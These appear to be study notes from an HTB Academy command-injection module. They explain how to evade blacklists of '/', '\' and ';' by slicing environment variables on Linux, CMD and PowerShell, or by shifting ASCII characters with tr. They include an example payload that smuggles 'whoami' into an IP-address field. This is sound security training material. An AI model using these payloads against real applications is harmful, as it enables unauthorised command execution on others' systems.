# Bypassing Other Blacklisted Characters

**Module:** HTB Academy – Command Injections
**Section:** 7 / 12

---

## Overview

- Besides operators and spaces, **slash (`/`)** and **backslash (`\`)** are commonly blacklisted (needed for directory paths).
- Goal: produce any needed character **without typing it directly** in the payload.

---

## Linux — Environment Variable Substring Technique

- `${IFS}` replaces directly with a space, but there's **no dedicated variable** for `/` or `;`.
- Trick: extract a single character from an existing env variable using **start:length** slicing.

### Example — Getting `/` from `$PATH`

```bash
echo ${PATH}
# /usr/local/bin:/usr/bin:/bin:/usr/games

echo ${PATH:0:1}
# /
```

- `${PATH:0:1}` = start at index 0, take length 1 → `/`
- **Note:** In the actual payload, omit `echo` — it's only used here to display the result.

### Example — Getting `;` from `$LS_COLORS`

```bash
echo ${LS_COLORS:10:1}
# ;
```

- Same slicing concept applied to a different variable to extract a semicolon.

### Combined Payload Example

```
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```

- Combines the semicolon substitution (`${LS_COLORS:10:1}`) with the space substitution (`${IFS}`) → bypasses both filters.

**Exercise:** Use `printenv` to list all environment variables, find ones containing useful characters, then slice them down to isolate the needed character.

## Windows — Variable Substring Technique

### CMD

```cmd
echo %HOMEPATH:~6,-11%
# \
```

- `%HOMEPATH%` → `\Users\htb-student`
- `~6` = start at position 6 → `\htb-student`
- `-11` = negative end offset (length of "htb-student") → trims down to just `\`

### PowerShell

- A string/word is treated as an **array of characters** in PowerShell — index directly, no start/length needed.

```powershell
$env:HOMEPATH[0]
# \

$env:PROGRAMFILES[10]
# (example of picking a different index for a different character)
```

- `Get-ChildItem Env:` lists all environment variables — browse for ones containing the character you need.

## Character Shifting Technique

- Produces a character by **shifting another character by a fixed offset**, avoiding direct use of the target character.

### Linux Example — Producing `\`

```bash
man ascii     # \ is ASCII 92; the character before it ([) is ASCII 91
echo $(tr '!-}' '"-~' <<< [)
# \
```

- `tr '!-}' '"-~'` shifts every character in the range up by one position.
- Feed it the character **immediately before** your target in the ASCII table → output is the target character.
- Find the "before" character using `man ascii`.

- Windows/PowerShell equivalents exist but tend to be longer.

**Exercise:** Use character shifting to produce a semicolon `;` — find the ASCII character before it, then apply the same `tr` technique.

---

## Key Takeaways

| Technique | Platform | Core Idea |
|---|---|---|
| Env var substring (`${VAR:start:len}`) | Linux | Slice a known variable's value down to one needed character |
| Env var substring (`%VAR:~start,end%`) | Windows CMD | Same concept with CMD slicing syntax |
| Array indexing (`$env:VAR[i]`) | Windows PowerShell | Index directly into the variable as an array |
| Character shifting (`tr`) | Linux | Shift an adjacent ASCII character by 1 to produce the target |

- All of these let an attacker avoid literally typing blacklisted characters like `/`, `\`, or `;` while still producing them at execution time.
